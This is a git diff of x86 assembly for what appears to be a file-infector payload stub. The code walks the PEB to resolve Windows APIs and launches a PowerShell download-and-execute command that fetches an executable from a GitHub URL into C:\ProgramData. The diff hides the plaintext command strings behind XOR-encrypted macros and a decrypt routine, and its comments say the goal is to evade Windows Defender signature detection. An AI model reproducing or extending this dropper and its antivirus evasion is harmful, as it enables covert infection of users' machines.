@@ -2,6 +2,8 @@ section .text
 [BITS 32]
 
 ; %define TLS
+
+%include "infection_strings.asm"
    
 global main
    ; this is now a TLS callback, which has the following header:
@@ -25,17 +27,19 @@ main:
 infection__data__start:         ; this prevents relocations from forming because we are not
                                 ; using absolute addresses for our data, making it more portable  
 infection__data__sheep:
-   db "C:\\ProgramData\\sheep.exe",0
+   LAUNCH_COMMAND               ; dd str_len
+   ;; db key
+   ;; db string_data
 infection__data__powershell:
-   db "powershell -ExecutionPolicy bypass "
-   db "-Command ", 34, "(New-Object System.Net.WebClient).DownloadFile(" ; nasm strings, lol
-   db "'https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe', 'C:\\ProgramData\\sheep.exe')", 34, 0
+   DOWNLOAD_COMMAND             ; dd str_len
+   ;; db key
+   ;; db string_data
 infection__data:
    pop ebx                      ; get the pointer to the start of the data
    mov eax, 0xFFFFFFCF          ; bypass Windows Defender matching on fs:[0x30]
-   inc eax
-   neg eax
-   mov eax, [fs:eax]            ; get current PEB
+   inc eax                      ; I am convinced the Wacatac signature is just Microsoft telling us
+   neg eax                      ; we are performing a "whack attack" and we should git gud
+   mov eax, [fs:eax]            ; get current PEB (fs:0x30)
    mov ecx, [eax+0xC]           ; peb->Ldr
    mov eax, [ecx+0xC]           ; ldr->InLoadOrderModuleList.Flink (the current module)
    mov ecx, [eax]               ; list_entry->InLoadOrderLinks.Flink (ntdll.dll)
@@ -62,7 +66,10 @@ infection__data:
    movups [ebp-0x14],xmm0
    mov dword [ebp-0x48],0x44
 
-   lea eax, [ebx+(infection__data__sheep-infection__data__start)] ; C:\ProgramData\sheep.exe
+   lea eax, [ebx+(infection__data__sheep-infection__data__start)] ; pointer to encrypted struct
+   push eax
+   call decrypt_string
+   lea eax, [ebx+(infection__data__sheep-infection__data__start)+5] ; C:\ProgramData\sheep.exe
    push eax
    call esi                                                       ; GetFileAttributesA("C:\\ProgramData\\sheep.exe")
    cmp eax, 0xFFFFFFFF          ; eax != INVALID_FILE_ATTRIBUTES
@@ -79,6 +86,8 @@ infection__data:
    push 0
    push 0
    lea eax, [ebx+(infection__data__powershell-infection__data__start)]
+   call decrypt_string
+   lea eax, [ebx+(infection__data__powershell-infection__data__start)+5]
    push eax
    push 0
    call [ebp-4]                 ; CreateProcessA(NULL, "powershell command", NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
@@ -127,6 +136,24 @@ infection__end:
 %else
    ret
 %endif
+
+   ;; [ebp+4]: the string struct
+decrypt_string:
+   push esi
+   mov eax,[ebp+4]
+   mov ecx,[eax]
+   mov dl,[eax+4]
+   lea esi,[eax+5]
+
+decrypt_loop:
+   xor [esi], dl
+   inc esi
+   dec ecx
+   test ecx,ecx
+   jnz decrypt_loop
+
+   pop esi
+   ret 4
    
    ; [ebp+4]: the dll module
    ; [ebp+8]: the 32-bit fnv321a hash value to look up
